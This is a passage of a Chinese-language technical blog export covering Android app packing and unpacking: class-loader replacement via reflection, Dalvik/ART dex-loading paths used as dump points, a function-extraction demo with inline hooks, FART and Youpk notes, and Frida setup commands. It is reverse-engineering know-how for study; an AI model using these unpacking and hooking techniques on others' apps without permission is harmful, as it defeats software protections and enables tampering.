","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:3:4","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"生命周期类处理 DexClassLoader加载的类是没有组件生命周期的,也就是说即使DexClassLoader通过对Apk的的动态加载完成了对组件类的加载,但是当系统启动该组件时,依然会出现类失败的异常. ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:4:0","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"解决方案 此时有两种解决方案: 替换系统组件类加载器为我们的DexClassLoader,同时设置DexClassLoader的parent为系统组件类加载器. 打破原有的双亲关系,在系统组件类加载器和BootClassLoader的中间插入我们自己的DexClassLoader即可. ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:4:1","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"代码实现 用As建立一个空工程,新建一个类,写一个测试Activity. package org.example.luodst; import android.app.Activity; import android.os.Bundle; import android.util.Log; import androidx.appcompat.app.AppCompatActivity; public class LuoTstActivity extends Activity { private final String TAG = \"[LuoHun] \"; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Log.d(TAG, \"org.example.luodst.LuoTstActivity onCreate\"); } } 编译上述工程,从apk中提取出Dex文件,传到手机的临时目录中. adb push classes.dex /data/local/tmp 方案一 用As建立另一个工程,来加载上述Dex文件,使用方案一处理Activity. package org.example.luoloaddex; import android.app.Activity; import android.content.Context; import android.content.Intent; import android.os.Bundle; import android.util.ArrayMap; import java.io.File; import java.lang.ref.WeakReference; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import dalvik.system.DexClassLoader; public class MainActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Context appContext = getApplicationContext(); startTstActivityFirstMethod(appContext, \"/data/local/tmp/classes.dex\"); } public void startTstActivityFirstMethod(Context context, String strDexFilePath) { File optFile = context.getDir(\"opt_dex\", 0); File libFile = context.getDir(\"lib_dex\", 0); DexClassLoader dexClassLoader = new DexClassLoader(strDexFilePath, optFile.getAbsolutePath(), libFile.getAbsolutePath(), MainActivity.class.getClassLoader()); replaceClassLoader(dexClassLoader); Class\u003c?\u003e clazz = null; try { clazz = dexClassLoader.loadClass(\"org.example.luodst.LuoTstActivity\"); } catch (ClassNotFoundException e) { e.printStackTrace(); } context.startActivity(new Intent(context, clazz)); } public void replaceClassLoader(ClassLoader classLoader) { try { //ActivityThread类中有一个静态方法currentActivityThread可以获取当前虚拟机创建的ActivityThread实例. Class\u003c?\u003e ActivityThreadClazz = classLoader.loadClass(\"android.app.ActivityThread\"); Method currentActivityThread = ActivityThreadClazz.getDeclaredMethod(\"currentActivityThread\"); currentActivityThread.setAccessible(true); Object activityThreadObj = currentActivityThread.invoke(null); //final ArrayMap\u003cString, WeakReference\u003cLoadedApk\u003e\u003e mPackages = new ArrayMap\u003c\u003e(); Field mPackagesField = ActivityThreadClazz.getDeclaredField(\"mPackages\"); mPackagesField.setAccessible(true); ArrayMap mPackagesObj = (ArrayMap) mPackagesField.get(activityThreadObj); WeakReference wr = (WeakReference) mPackagesObj.get(this.getPackageName()); Object loadedApkObj = wr.get(); Class loadedApkClazz = classLoader.loadClass(\"android.app.LoadedApk\"); //private ClassLoader mClassLoader; Field mClassLoader = loadedApkClazz.getDeclaredField(\"mClassLoader\"); mClassLoader.setAccessible(true); mClassLoader.set(loadedApkObj, classLoader); } catch (NoSuchFieldException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (ClassNotFoundException e) { e.printStackTrace(); } } } 方案二 用As建立另一个工程,来加载上述Dex文件,使用方案二处理Activity. package org.example.luoloaddex; import android.app.Activity; import android.content.Context; import android.content.Intent; import android.os.Bundle; import android.util.ArrayMap; import java.io.File; import java.lang.ref.WeakReference; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import dalvik.system.DexClassLoader; public class MainActivity extends Activity { @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Context appContext = getApplicationContext(); startTstActivitySecondMethod(appContext, \"/data/local/tmp/classes.dex\"); } public void startTstActivitySecondMethod(Context context, String strDexFilePath) ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:4:2","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"加壳技术 ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:5:0","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"发展 Dex加固 Dex整体加固:文件加载和内存加载. 函数抽取:在函数粒度完成代码的保护. VMP和Dex2C:Java函数Native化. So加固 基于init、init_array以及JNI_Onload函数的加壳. 基于自定义linker的加壳. ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:5:1","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"识别 是否Native化 函数体无效 函数抽取类壳 ✘ ✔ VMP壳 ✔ Native化 Dex2C壳 ✔ Native化 VMP和Dex2C的区分 VMP:核心原理是Dalvik和Art下的解释器,对Smali指令流的解析执行过程. 可参考:https://github.com/chago/ADVMP Dex2C:将Java函数转成C函数. 可参考:https://github.com/amimo/dcc 注册地址是否相同 函数逻辑是否相似 VMP壳 ✔ ✔ Dex2C壳 ✘ ✘ ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:5:2","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"各种壳解决方案 整体加固 文件加载:定位解密文件是关键. 内存加载:加载时机和内存起始地址时关键. 方案:Dex打开和优化的流程呢以及产出的odex、dex2oat编译的流程和生成的oat文件等等. 函数抽取 类加载和函数执行前的流程解密. 函数执行中动态自解密. 方案:关注被抽取的函数的执行流程是关键! 定位被抽取的函数的恢复时机即可. VMP和Dex2C VMP:定位解释器是关键,找到映射关系便可恢复. Dex2C:基础是编译原理,进行了等价语义转换.彻底还原难度巨大. 方案:关注JNI相关的api调用是关键,也是分析VMP和Dex2C保护的函数的逻辑的关键. ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:5:3","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"一代壳(Dex整体加固) ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:6:0","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"Dalvik DexClassLoader 通过对Dalvik下DexClassLoader加载Dex源码分析,来确定脱壳点. //http://androidxref.com/4.4.4_r1/xref/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java DexClassLoader -\u003e... -\u003e... -\u003e... //进入Native函数 -\u003eopenDexFileNative(Dalvik_dalvik_system_DexFile_openDexFileNative) -\u003edvmRawDexFileOpen(const char* fileName, const char* odexOutputName, RawDexFile** ppRawDexFile, bool isBootstrap) -\u003edvmOptimizeDexFile(int fd, off_t dexOffset, long dexLength, const char* fileName, u4 modWhen, u4 crc, bool isBootstrap) { //--- pid = fork(); if (pid == 0) { static const int kUseValgrind = 0; static const char* kDexOptBin = \"/bin/dexopt\"; //--- } } //从上述代码来看,通过调dexopt来对Dex文件进行优化 //查看dexopt源代码 //http://androidxref.com/4.4.4_r1/xref/dalvik/dexopt/OptMain.cpp main -\u003efromDex(int argc, char* const argv[]) -\u003edvmContinueOptimization(int fd, off_t dexOffset, long dexLength, const char* fileName, u4 modWhen, u4 crc, bool isBootstrap) //http://androidxref.com/4.4.4_r1/xref/dalvik/vm/analysis/DexPrepare.cpp#527 //从上述函数,开始脱壳寻找时机. -\u003erewriteDex(u1* addr, int len, bool doVerify, bool doOpt, DexClassLookup** ppClassLookup, DvmDex** ppDvmDex) -\u003edvmDexFileOpenPartial(const void* addr, int len, DvmDex** ppDvmDex) -\u003edexFileParse(const u1* data, size_t length, int flags) -\u003e... 以上过程出现加载的Dex文件起始地址和大小的地方都是脱壳点. 目前网上常用的脱壳点是dvmDexFileOpenPartial以及dexFileParse函数,从这两个函数开始脱,Dump出来的是odex文件. ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:6:1","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"ART InMemoryDexClassLoader 通过对ART下InMemoryDexClassLoader加载Dex源码分析,来确定脱壳点. //http://aospxref.com/android-8.0.0_r36/xref/libcore/dalvik/src/main/java/dalvik/system/InMemoryDexClassLoader.java InMemoryDexClassLoader -\u003eBaseDexClassLoader -\u003eDexPathList -\u003emakeInMemoryDexElements -\u003eDexFile -\u003eopenInMemoryDexFile -\u003enative Object createCookieWithDirectBuffer(ByteBuffer buf, int start, int end); native Object createCookieWithArray(byte[] buf, int start, int end); -\u003eCreateSingleDexFileCookie -\u003eCreateDexFile -\u003eDexFile::Open -\u003eDexFile::OpenCommon -\u003eDexFile::DexFile(const uint8_t* base,size_t size,const std::string\u0026 location,uint32_t location_checksum,const OatDexFile* oat_dex_file) InMemoryDexClassLoader没有生成oat文件的流程,注意以上流程中出现Dex文件起始地址和大小的地方. DexClassLoader 通过对ART下DexClassLoader加载Dex源码分析,来确定脱壳点. //http://aospxref.com/android-8.0.0_r36/xref/libcore/dalvik/src/main/java/dalvik/system/DexClassLoader.java DexClassLoader -\u003eBaseDexClassLoader -\u003eDexPathList -\u003emakeDexElements -\u003eloadDexFile -\u003eDexFile.loadDex -\u003eprivate DexFile(String sourceName, String outputName, int flags, ClassLoader loader,DexPathList.Element[] elements) -\u003eopenDexFile -\u003eprivate static native Object openDexFileNative(String sourceName, String outputName, int flags,ClassLoader loader, DexPathList.Element[] elements); -\u003eOatFileManager::OpenDexFilesFromOat //最终会调用dex2oat -\u003eOatFileAssistant::MakeUpToDate -\u003eOatFileAssistant::GenerateOatFileNoChecks -\u003eOatFileAssistant::Dex2Oat //http://aospxref.com/android-8.0.0_r36/xref/art/runtime/oat_file_manager.cc?fi=OpenDexFilesFromOat#OpenDexFilesFromOat //从上述OatFileManager::OpenDexFilesFromOat这个函数开始分析 //如果说阻断了Dex转Oat过程,系统会尝试加载Dex OatFileManager::OpenDexFilesFromOat -\u003eDexFile::Open(const char* filename,const std::string\u0026 location,bool verify_checksum,std::string* error_msg,std::vector\u003cstd::unique_ptr\u003cconst DexFile\u003e\u003e* dex_files) -\u003eFile OpenAndReadMagic(const char* filename, uint32_t* magic, std::string* error_msg) DexFile::OpenFile(int fd,const std::string\u0026 location,bool verify,bool verify_checksum,std::string* error_msg) -\u003eDexFile::OpenCommon -\u003eDexFile::DexFile(const uint8_t* base,size_t size,const std::string\u0026 location,uint32_t location_checksum,const OatDexFile* oat_dex_file) ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:6:2","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"二代壳(函数抽取) ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:7:0","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"Dalvik 流程图 上述流程为什么要Hook dexFindClass函数? 我们在Java层主动加载一个类是调用的dexClassLoader.loadClass(可以参考上面的类加载时机),来加载类的.因此可以阅读DexClassLoader类的loadClass源码来寻求答案. http://androidxref.com/4.4.4_r1/xref/libcore/libdvm/src/main/java/java/lang/ClassLoader.java 参考链接 http://www.520monkey.com/archives/1115 http://www.520monkey.com/archives/1118 Android免Root权限通过Hook系统函数修改程序运行时内存指令逻辑.mhtml Android中实现「类方法指令抽取方式」加固方案原理解析.mhtml ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:7:1","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"ART 手工抽取思路 首先要干掉Dex2oat过程,如果不干掉这个过程,系统对抽取的Dex文件进行编译生成了oat文件,那么我们动态修改的Dex中的Smali指令就不会生效! 干掉Dex2oat过程可从OatFileAssistant::GenerateOatFileNoChecks这个函数开始分析,因为这个函数内容会调用OatFileAssistant::Dex2Oat这个函数. 解析Dex文件格式,找到要抽取函数的CodeItem,记下其中的指令,将其填充为0. 寻找一个Hook时机(ClassLinker::LoadMethod),在系统执行抽取的函数之前,将其原指令填充回去. 示例 本次实现环境:Android8.1 准备一个测试Dex文件. package com.example.luodst; import android.util.Log; public class LuoTst { private final String TAG = \"[LuoHun] \"; public void fun1() { Log.d(TAG, \"org.example.luodst.fun1\"); } } 在AndroidStudio中编译上述代码,生成一个测试Dex文件. 用010Editor打开上述Dex,找到com.example.luodst.LuoTst类的fun1方法二进制指令,记下原来的并将其填充为0 struct class_def_item class_def[1484] public com.example.luodst.LuoTst B2DA4h 20h Fg: Bg:0xE0E0E0 Class ID struct method_id_item method_id[22370] void com.example.luodst.LuoTst.fun1() 96C34h 8h Fg: Bg:0x008080 Method ID 下面用GDA打开上述修改后的Dex文件,来看下现象. 重新计算上述修改后的Dex文件的checksum和sha值,回写到Dex的文件头部中. 将上述修改后的Dex文件,放到手机的/data/local/tmp目录下. 在调用抽取的的函数之前,将原始指令回填(Hook ClassLinker::LoadMethod),反射调用被抽取的函数. //Java package com.example.luoclassloader; import androidx.appcompat.app.AppCompatActivity; import android.content.Context; import android.os.Bundle; import android.util.Log; import android.widget.TextView; import com.example.luoclassloader.databinding.ActivityMainBinding; import java.io.File; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import dalvik.system.DexClassLoader; public class MainActivity extends AppCompatActivity { private final String TAG = \"[LuoHun] \"; // Used to load the 'luoclassloader' library on application startup. static { System.loadLibrary(\"luoclassloader\"); } private ActivityMainBinding binding; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); binding = ActivityMainBinding.inflate(getLayoutInflater()); setContentView(binding.getRoot()); //二代壳 SecondShell(); //反射运行抽空的方法 tstDexClassLoader(getApplicationContext(), \"/data/local/tmp/2.dex\"); } public void tstDexClassLoader(Context context, String strDexFilePath) { File optFile = context.getDir(\"opt_dex\", 0); File libFile = context.getDir(\"lib_dex\", 0); DexClassLoader dexClassLoader = new DexClassLoader(strDexFilePath, optFile.getAbsolutePath(), libFile.getAbsolutePath(), context.getClassLoader()); Class clazz = null; try { clazz = dexClassLoader.loadClass(\"com.example.luodst.LuoTst\"); Object object = clazz.newInstance(); Method func1Method = clazz.getDeclaredMethod(\"fun1\"); func1Method.invoke(object); } catch (ClassNotFoundException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } } public native void SecondShell(); } //Native #include \u003cjni.h\u003e#include \u003cstring\u003e#include \u003cunistd.h\u003e#include \u003candroid/log.h\u003e#include \u003cfcntl.h\u003e#include \u003casm/fcntl.h\u003e#include \u003csys/mman.h\u003e#include \u003cdlfcn.h\u003e #include \u003csys/types.h\u003e#include \u003csys/stat.h\u003e //import c header extern \"C\" { #include \"hook/dlfcn/dlfcn_compat.h\"#include \"hook/include/inlineHook.h\"} typedef unsigned char byte; #define TAG \"SecondShell\" #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, TAG, __VA_ARGS__) struct DexFile { // Field order required by test \"ValidateFieldOrderOfJavaCppUnionClasses\". // The class we are a part of. uint32_t declaring_class_; // Access flags; low 16 bits are defined by spec. void *begin; /* Dex file fields. The defining dex file is available via declaring_class_-\u003edex_cache_ */ // Offset to the CodeItem. uint32_t size; }; struct ArtMethod { // Field order required by test \"ValidateFieldOrderOfJavaCppUnionClasses\". // The class we are a part of. uint32_t declaring_class_; // Access flags; low 16 bits are defined by spec. uint32_t access_flags_; /* Dex file fields. The defining dex file is available via declaring_class_-\u003edex_cache_ */ // Offset to the CodeItem. uint32_t dex_code_item_offset_; // Index in","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:7:2","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"Fart演变 https://bbs.pediy.com/thread-254555.htm 安卓APP脱壳的本质以及如何快速发现ART下的脱壳点.mhtml ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:8:0","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"V1.0: classloader中dump 时机 App中的Application类中的attachBaseContext和onCreate函数是App中最先执行的方法. 因此需要选在Application的onCreate函数执行之后才开始被调用的任意一个函数中. 比如选择在ActivityThread中的performLaunchActivity函数作为时机,来获取最终应用的ClassLoader. 方式 获取到应用解密后的Dex文件最终依附的ClassLoader之后,通过Java的反射机制最终获取到对应的DexFile的结构体,并完成Dex的Dump. ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:8:1","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"V2.0 “海量\"的脱壳点 时机 所有类和方法的装载和链接、编译和执行流程之中. 方式 ART下DexFile类中定义了两个关键的变量:begin_、size_以及用于获取这两个变量的Begin()和Size()函数. 这两个变量分别代表着当前DexFile对象对应的内存中的Dex文件加载的起始位置和大小. 只要有了这两个值,我们就可以完成对Dex的Dump. ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:8:2","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"V3.0 优中选优 时机 找到绕过dex2oat的时机. 类的初始化函数始终运行在ART下的inpterpreter模式. 方式 在解释执行时进行脱壳,实现\"绕过\"dex2oat. 因此必然进入到interpreter.cc文件中的Execute函数,从而进入ART下的解释器解释执行. ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:8:3","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"V4.0 双保险 同时在dex2oat和类的初始化流程函数设置\"Hook” ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:8:4","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"Fart8.0源码 FART_aosp8.0.7z ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:8:5","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"Youpk https://bbs.pediy.com/thread-259854.htm ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:9:0","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"时机 App启动后10s开始 ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:9:1","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["Android基础"],"content":"方式 禁用dex2oat:在dex2oat中设置CompilerFilter为仅验证. //dex2oat.cc compiler_options_-\u003eSetCompilerFilter(CompilerFilter::kVerifyAtRuntime); 从ClassLinker中遍历DexFile对象并dump ","date":"2021-12-15","objectID":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/:9:2","tags":["加壳与脱壳"],"title":"App加壳和脱壳","uri":"/posts/android/android%E5%9F%BA%E7%A1%80/app%E5%8A%A0%E5%A3%B3%E5%92%8C%E8%84%B1%E5%A3%B3/"},{"categories":["那些年遇过的坑"],"content":"VMware 当前记录的VMware版本为16.2.1 build-18811642 需要注意的是,如果要对VMware中运行的系统进行内存修改,在Windwos下要调试的进程是vmware-vmx.exe而不是vmware.exe ","date":"2021-12-14","objectID":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/vmware/:0:0","tags":["VMware"],"title":"VMware内存修改","uri":"/posts/%E9%82%A3%E4%BA%9B%E5%B9%B4%E9%81%87%E8%BF%87%E7%9A%84%E5%9D%91/vmware/"},{"categories":["Android Hook"],"content":"Frida-Java层Hook ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:0:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"IDE配置 安装Node.js https://nodejs.org/zh-cn/ apt-get install nodejs apt-get install npm 下载frida-agent-example仓库. https://github.com/oleavr/frida-agent-example git clone https://github.com/oleavr/frida-agent-example.git 执行命令. cd frida-agent-example/ npm install 接下来使用VSCode打开此项目，在agent目录下编写代码就会有智能提示. ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:1:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"Frida基础 https://github.com/frida/frida ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:2:0","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"Frida安装 本地Python模块安装. #下述以安装特定版本为例. #12.8.0 pip install frida==12.8.0 pip install frida-tools==5.3.0 pip install objection==1.8.4 #14.2.13 pip install frida==14.2.13 pip install frida-tools==9.2.1 pip install objection==1.11.0 目标机frida-sever下载,官方下载地址：https://github.com/frida/frida/releases 下载时要选择对应的版本下载. #①frida-server的版本要和计算机上的版本一致. #如frida版本为14.2.13,那么frida-server的版本也必须是14.2.13 #②frida-server的架构需要和测试机的系统以及架构一致. #如本人使用的Android测试机Nexus 5X是arm64的架构,就需要下载frida-server相应的arm64的 #可使用下述命令查询系统架构. adb shell getprop ro.product.cpu.abi 将下载的frida-server安装到手机并运行. adb push frida-server /data/local/tmp/frida-server adb shell su chmod 777 /data/local/tmp/frida-server /data/local/tmp/frida-server 检查frida是否安装成功. frida-ps -U 需要注意的是, Windows要将frida-ps所在的路径添加到环境变量中. 如:D:\\LuoHackTools\\Tools\\Disassemblers\\IDA_Pro_v7.5\\python38\\Scripts ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:2:1","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"adbWifi连接 PC和手机要连接同一个Wifi 下载安装WiFiADB.apk. #google 搜apkmirror wifi adb https://www.apkmirror.com/apk/metactrl/wifi-adb-debug-over-air/ 手机上运行上述apk,进行一些简单的设置. 拔掉数据线,执行下述命令,进行adb连接. adb connect 192.168.2.111:5555 ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:2:2","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"非标准端口连接 手机上运行FridaServer,监听指定端口. #adb connect 192.168.2.111:5555 adb push frida-server /data/local/tmp/frida-server adb shell su chmod 777 /data/local/tmp/frida-server /data/local/tmp/frida-server -l 0.0.0.0:6666 PC上执行Frida命令. #frida-ps -H 192.168.2.111:6666 frida-ps -H 手机的ip:frida监听的端口 #frida -H 192.168.2.111:6666 com.example.luoanti -l .\\LuoHook.js #objection -N -h 192.168.2.111 -p 6666 -g com.android.settings explore objection -N -h 手机的ip -p frida监听的端口 -g 安卓应用 explore ","date":"2021-11-25","objectID":"/posts/android/android-hook/frida-java%E5%B1%82hook/:2:3","tags":["Frida"],"title":"Frida-Java层Hook","uri":"/posts/android/android-hook/frida-java%E5%B1%82hook/"},{"categories":["Android Hook"],"content":"基本知识 在Android逆向过程中,Frida存在两种操作模式. CLI(命令行)模式:通过命令行直接将JavaScript脚本注入进程中,对进程进行操作. frida -U LuoDst -l luoHook.js #-U 指定对USB设备操作. #-l 指定加载一个Javascript脚本. RPC模式:使用Python进行JavaScript脚本的注入工作,实际对进程进行操作的还是JavaScript脚本. 